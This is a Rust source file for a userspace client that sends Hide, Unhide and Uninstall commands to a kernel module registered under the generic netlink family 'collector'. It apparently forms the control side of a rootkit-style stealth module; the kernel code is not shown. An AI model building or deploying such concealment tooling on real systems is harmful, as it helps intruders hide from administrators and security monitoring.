use std::process;
use neli::err::NlError;
use neli::types::{GenlBuffer};
use neli::socket::NlSocketHandle;
use neli::nl::{NlPayload, Nlmsghdr};
use neli::genl::{Genlmsghdr, Nlattr};
use neli::consts::socket::NlFamily;
use neli::consts::nl::{NlmF, NlmFFlags};

const KERNEL_PID: u32 = 0;
const APP_VERSION: u8 = 1;
pub const FAMILY_NAME: &str = "collector";

pub type CommandExecResult = i8;

neli::impl_var!(pub Command, u8,
        Hide => 0,
        Unhide => 1,
        Uninstall => 2);

neli::impl_var!(MessageAttribute, u16,
        Unspec => 0,
        Msg => 1);

impl neli::consts::genl::Cmd for Command {}
impl neli::consts::genl::NlAttrType for MessageAttribute {}

pub fn exec_command(command: Command, arg: Option<String>)
    -> Result<CommandExecResult, NlError>
{
    println!("Exec command: {:?}, arg: {:?}", command, arg);

    let mut sock = NlSocketHandle::connect(NlFamily::Generic, Some(KERNEL_PID), &[])?;
    let family_id = sock.resolve_genl_family(FAMILY_NAME)?;

    let mut attrs = GenlBuffer::new();
    if arg.is_some() {
        attrs.push(Nlattr::new(
            None, // nla_len
            false, // nla_nested
            false, // nla_network_order
            MessageAttribute::Msg, // payload type
            arg.unwrap()).unwrap());
    }

    let generic_netlink_header = Genlmsghdr::new(command, APP_VERSION, attrs);
    let netlink_header = Nlmsghdr::new(
        None, // nl_len
        family_id,
        NlmFFlags::new(&[NlmF::Request]),
        None, // nl_seq
        Some(process::id()), // used to id app
        NlPayload::Payload(generic_netlink_header));

    sock.send(netlink_header)?;
    let recv_res = sock.recv()?;
    if recv_res.is_none() {
        return Err(NlError::Msg(String::from("Received empty nl header")));
    }

    let recv_header: Nlmsghdr<u16, Genlmsghdr<Command, MessageAttribute>> = recv_res.unwrap();
    let payload = recv_header.get_payload()?;
    let result = payload
        .get_attr_handle()
        .get_attr_payload_as::<u8>(MessageAttribute::Msg)?;

    return Ok(result as CommandExecResult);
}